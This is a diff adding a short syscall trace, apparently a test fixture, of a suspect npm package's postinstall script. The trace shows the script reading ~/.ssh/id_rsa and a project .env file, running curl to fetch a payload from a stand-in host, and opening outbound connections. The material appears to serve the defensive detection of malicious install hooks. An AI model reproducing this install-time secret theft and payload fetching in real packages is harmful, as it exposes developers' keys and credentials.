@@ -1,0 +1,11 @@
+101 execve("/bin/sh", ["sh", "-lc", "node postinstall.js"], 0x7fff0000) = 0
+101 openat(AT_FDCWD, "/home/dev/project/node_modules/suspect/package.json", O_RDONLY|O_CLOEXEC) = 3
+101 openat(AT_FDCWD, "/home/dev/.ssh/id_rsa", O_RDONLY|O_CLOEXEC) = 3
+101 openat(AT_FDCWD, "/home/dev/project/node_modules/suspect/build/output.node", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 4
+101 execve("/usr/bin/curl", ["curl", "https://example.invalid/payload"], 0x7fff0000) = 0
+101 socket(AF_INET, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_TCP) = 5
+101 connect(5, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.10")}, 16) = -1 EINPROGRESS (Operation now in progress)
+101 openat(AT_FDCWD</home/dev/project>, ".env", O_RDONLY|O_CLOEXEC) = 6</home/dev/project/.env>
+101 connect(7<TCPv6:[109974]>, {sa_family=AF_INET6, sin6_port=htons(9), inet_pton(AF_INET6, "::1", &sin6_addr), sin6_flowinfo=htonl(0), sin6_scope_id=0}, 28) = -1 EINPROGRESS (Operation now in progress)
+101 openat(AT_FDCWD, "/tmp/slow.txt", O_WRONLY|O_CREAT|O_TRUNC <unfinished ...>
+101 <... openat resumed>) = 8</tmp/slow.txt>
